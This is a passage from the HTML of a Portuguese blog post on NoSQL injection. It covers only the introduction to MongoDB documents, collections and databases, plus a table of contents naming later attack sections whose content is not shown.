@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="pt" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>NoSQL - Injection – Alex Paulino</title>
+  <meta name="description" content="NoSQL As informações não são armazenadas em tabelasmas sim em documentos. Exemplo de banco de dados em NoSQL: MongoDB.
+MongoDB Em um banco de dados NoSQL os valores são salvos em pares: chave-valor, por exemplo, um banco de dados do departamento de RH.
+{&#34;_id&#34; : ObjectId(&#34;5f077332de2cdf808d26cd74&#34;), &#34;username&#34; : &#34;lphillips&#34;, &#34;first_name&#34; : &#34;Logan&#34;, &#34;last_name&#34; : &#34;Phillips&#34;, &#34;age&#34; : &#34;65&#34;, &#34;email&#34; : &#34;lphillips@example.com&#34; }" /><link rel="canonical" href="http://localhost:1313/posts/2025/2025-03-06-nosql-injection/" itemprop="url" />
+
+<meta property="og:title" content="NoSQL - Injection">
+<meta
+  property="og:description"
+  content="
+    
+      NoSQL
+    As informações não são armazenadas em tabelasmas sim em documentos.
+Exemplo de banco de dados em NoSQL: MongoDB.
+MongoDB
+    Em um banco de dados NoSQL os valores são salvos em pares: chave-valor, por exemplo, um banco de dados do departamento de RH.
+{&quot;_id&quot; : ObjectId(&quot;5f077332de2cdf808d26cd74&quot;), &quot;username&quot; : &quot;lphillips&quot;, &quot;first_name&quot; : &quot;Logan&quot;, &quot;last_name&quot; : &quot;Phillips&quot;, &quot;age&quot; : &quot;65&quot;, &quot;email&quot; : &quot;lphillips@example.com&quot; }
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/posts/2025/2025-03-06-nosql-injection/"><meta property="article:section" content="posts">
+
+<meta
+  property="article:published_time"
+  content="2025-03-06T21:50:00-03:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2025-03-06T21:50:00-03:00">
+
+
+
+	<meta itemprop="name" content="NoSQL - Injection">
+	<meta itemprop="description" content="NoSQL As informações não são armazenadas em tabelasmas sim em documentos. Exemplo de banco de dados em NoSQL: MongoDB.
+MongoDB Em um banco de dados NoSQL os valores são salvos em pares: chave-valor, por exemplo, um banco de dados do departamento de RH.
+{&#34;_id&#34; : ObjectId(&#34;5f077332de2cdf808d26cd74&#34;), &#34;username&#34; : &#34;lphillips&#34;, &#34;first_name&#34; : &#34;Logan&#34;, &#34;last_name&#34; : &#34;Phillips&#34;, &#34;age&#34; : &#34;65&#34;, &#34;email&#34; : &#34;lphillips@example.com&#34; }">
+	<meta itemprop="datePublished" content="2025-03-06T21:50:00-03:00">
+	<meta itemprop="dateModified" content="2025-03-06T21:50:00-03:00">
+	<meta itemprop="wordCount" content="1069">
+	<meta itemprop="keywords" content="Web,Sql,Injection,Database">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="NoSQL - Injection">
+	<meta name="twitter:description" content="NoSQL As informações não são armazenadas em tabelasmas sim em documentos. Exemplo de banco de dados em NoSQL: MongoDB.
+MongoDB Em um banco de dados NoSQL os valores são salvos em pares: chave-valor, por exemplo, um banco de dados do departamento de RH.
+{&#34;_id&#34; : ObjectId(&#34;5f077332de2cdf808d26cd74&#34;), &#34;username&#34; : &#34;lphillips&#34;, &#34;first_name&#34; : &#34;Logan&#34;, &#34;last_name&#34; : &#34;Phillips&#34;, &#34;age&#34; : &#34;65&#34;, &#34;email&#34; : &#34;lphillips@example.com&#34; }">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+<script src="/js/main-head.js" integrity=""></script>
+
+  
+  
+  </head>
+<body>
+    <a href="#content" class="hx:sr-only hx:focus-visible:not-sr-only hx:focus-visible:fixed hx:focus-visible:z-50 hx:focus-visible:top-2 hx:focus-visible:left-2 hx:focus-visible:bg-primary-500 hx:focus-visible:text-white hx:focus-visible:px-4 hx:focus-visible:py-2 hx:focus-visible:rounded-md hx:focus-visible:text-sm hx:focus-visible:font-medium">Saltar para o conteúdo</a><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-1 hx:md:gap-2 hx:h-[var(--hextra-navbar-height)] hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none">Alex Paulino</span>
+</a>
+<button
+    type="button"
+    class="hextra-search-trigger"
+    data-search-open
+    aria-haspopup="dialog"
+    aria-controls="hextra-search-dialog"
+    aria-label="Procurar..."
+  ><svg class="hextra-search-trigger-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><span class="hextra-search-trigger-label">Procurar...</span>
+    <kbd class="hextra-search-trigger-kbd">CTRL K</kbd>
+  </button><a
+  title=""
+  href="/about/"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Sobre</span>
+</a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/alxpas" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/alexpaulino/" title="LinkedIn"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037c-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85c3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065a2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span class="hx:sr-only">LinkedIn</span>
+          </a><button type="button" aria-label="Menu" aria-expanded="false" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-1 hx:rounded-sm hx:p-1 hx:active:bg-gray-400/20 hx:md:hidden hx:hextra-focus-visible-inset"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-[var(--hextra-navbar-height)] hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--hextra-navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      <li><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/about/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Sobre</span>
+    </a>
+  </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  
+    <div class="hx:md:hidden hx:justify-end hx:sticky hx:bottom-0 hx:max-h-(--menu-height) hx:bg-white hx:dark:bg-dark hx:mx-4 hx:py-4 hx:shadow-[0_-12px_16px_#fff] hx:flex hx:items-center hx:gap-2 hx:border-gray-200 hx:dark:border-neutral-800 hx:dark:shadow-[0_-12px_16px_#111] hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:shadow-none hx:border-t" data-toggle-animation="show"><div class="hx:flex hx:justify-items-start hx:grow">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-03-06-nosql-injection/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom-right"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+</div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div></aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="Índice">
+    <div class="hextra-scrollbar hx:sticky hx:top-[var(--hextra-navbar-height)] hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--hextra-navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">Nesta página</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#nosql">NoSQL
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#mongodb">MongoDB
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#consultando-banco-de-dados">Consultando banco de dados
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#nosql-injection">NoSQL injection
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#exemplo">Exemplo
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#bypassing-the-login-screen">Bypassing the Login Screen
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#operator-injection-logging-in-as-other-users">Operator Injection: Logging in as Other Users
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#operator-injection-extracting-users-passwords">Operator Injection: Extracting Users’ Passwords
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#syntax-injection-identification-and-data-extraction">Syntax Injection: Identification and Data Extraction
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#conclus%c3%a3o">Conclusão
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button id="backToTop" tabindex="-1" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>Voltar ao topo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--hextra-navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main id="content" class="hx:w-full hx:min-w-0 hextra-max-content-width hx:px-6 hx:pt-4 hx:md:px-12">
+        
+        
+        <br class="hx:mt-1.5 hx:text-sm" />
+        <h1 class="hx:text-center hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">NoSQL - Injection</h1>
+        <div class="hx:mb-16"></div>
+        <div class="content">
+          
+          <h2 data-hextra-search-id="nosql">NoSQL<span class="hx:absolute hx:-mt-20" id="nosql"></span>
+    <a href="#nosql" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>As informações não são armazenadas em <code>tabelas</code>mas sim em <code>documentos</code>.
+Exemplo de banco de dados em <strong>NoSQL</strong>: MongoDB.</p>
+<h3 data-hextra-search-id="mongodb">MongoDB<span class="hx:absolute hx:-mt-20" id="mongodb"></span>
+    <a href="#mongodb" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Em um banco de dados NoSQL os valores são salvos em pares: <code>chave-valor</code>, por exemplo, um banco de dados do departamento de RH.</p>
+<p><code>{&quot;_id&quot; : ObjectId(&quot;5f077332de2cdf808d26cd74&quot;), &quot;username&quot; : &quot;lphillips&quot;, &quot;first_name&quot; : &quot;Logan&quot;, &quot;last_name&quot; : &quot;Phillips&quot;, &quot;age&quot; : &quot;65&quot;, &quot;email&quot; : &quot;lphillips@example.com&quot; }</code></p>
+<p>Esses são os <code>documentos</code>, armazenado em uma matriz associativa com um número arbitrário de campos.
+Esses <code>documentos</code>são estruturados em uma hierarquia superior, chamada de <code>coleções</code>, essas por sua vez são equivalentes as <code>tabelas</code> que temos em um banco de dados relacional.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-collections.png" alt="Collections"  loading="lazy" /></p>
+<p>As <code>coleçoes</code>são agrupadas em um banco de dados.</p>
+<p><img src="/assets/img/posts/2025/03/nosql-injection/nosql-database.png" alt="Databases"  loading="lazy" /></p>
+<h3 data-hextra-search-id="consultando-banco-de-dados">Consultando banco de dados<span class="hx:absolute hx:-mt-20" id="consultando-banco-de-dados"></span>
